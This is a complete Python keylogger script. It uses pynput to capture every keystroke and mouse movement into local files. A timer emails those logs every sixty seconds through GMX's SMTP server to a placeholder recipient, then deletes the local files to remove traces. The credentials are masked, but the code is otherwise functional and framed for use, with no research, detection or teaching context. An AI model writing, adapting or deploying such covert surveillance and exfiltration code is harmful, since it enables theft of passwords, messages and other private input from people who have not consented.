import smtplib
from email.message import EmailMessage
import os
import datetime
from pynput.keyboard import Key, Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import threading
import time

# Files for saving keyboard and mouse data
keyboard_log_file = "keyboard.txt"
mouse_log_file = "mouse.txt"

# Buffer to store keyboard input
buffer = ""

# Function to save the keyboard buffer to a file
def save_to_file(text, log_file):
    with open(log_file, 'a') as f:
        f.write(text)

# Function to handle key presses (keyboard input)
def on_key_press(key):
    global buffer
    try:
        if key.char:  # If it's a normal character
            buffer += key.char
    except AttributeError:
        if key == Key.space:  # Space indicates the end of a word
            buffer += " "
            save_to_file(buffer, keyboard_log_file)
            buffer = ""  # Reset the buffer
        elif key == Key.enter:  # Enter key indicates the end of a line
            buffer += "\n"
            save_to_file(buffer, keyboard_log_file)
            buffer = ""  # Reset the buffer
        elif key == Key.backspace:  # Handle backspace
            buffer = buffer[:-1]  # Remove last character in the buffer

# Function to handle mouse movement and log positions
def mouse_position(x, y):
    with open(mouse_log_file, "a") as f:
        f.write(f"Current pointer position is: ({x}, {y})\n")

# Function to send email with logged data
def send_email():
    try:
        # Read the log files
        with open(keyboard_log_file, 'r') as f:
            keyboard_data = f.read()
        with open(mouse_log_file, 'r') as f:
            mouse_data = f.read()

        # GMX email login credentials
        gmx_user = '***'  # Replace with your GMX email
        gmx_password = '****'  # Replace with your GMX password

        # Create email message
        message = EmailMessage()
        message['Subject'] = 'Keyboard and Mouse Activity Logs'
        message['From'] = gmx_user
        message['To'] = '******'  # Replace with your recipient email
        message.set_content(f"Here are the recent logs:\n\nKeyboard:\n{keyboard_data}\n\nMouse:\n{mouse_data}")

        # Attach files
        for file in [keyboard_log_file, mouse_log_file]:
            if os.path.exists(file):
                with open(file, 'rb') as f:
                    file_data = f.read()
                    file_name = os.path.basename(file)
                    message.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

        # Connect to GMX SMTP server
        with smtplib.SMTP('smtp.gmx.com', 587) as server:
            server.starttls()  # Start TLS encryption
            server.login(gmx_user, gmx_password)
            server.send_message(message)

        # Print success message with current time
        print(f"Email sent successfully at {datetime.datetime.now()}")

        # Clean up: Remove log files after sending email
        os.remove(keyboard_log_file)
        os.remove(mouse_log_file)
    except Exception as e:
        print(f"Error sending email: {e}")

# Function to repeatedly send the email every minute
def email_timer():
    send_email()  # Send email
    threading.Timer(60, email_timer).start()  # Set the next email to send in 60 seconds

# Start the email timer immediately
email_timer()

# Start the keylogger listener
with KeyboardListener(on_press=on_key_press) as keyboard_listener:
    # Start mouse listener
    with MouseListener(on_move=mouse_position) as mouse_listener:
        # Run both listeners indefinitely
        keyboard_listener.join()  # Keep listening for keyboard events
        mouse_listener.join()  # Keep listening for mouse events
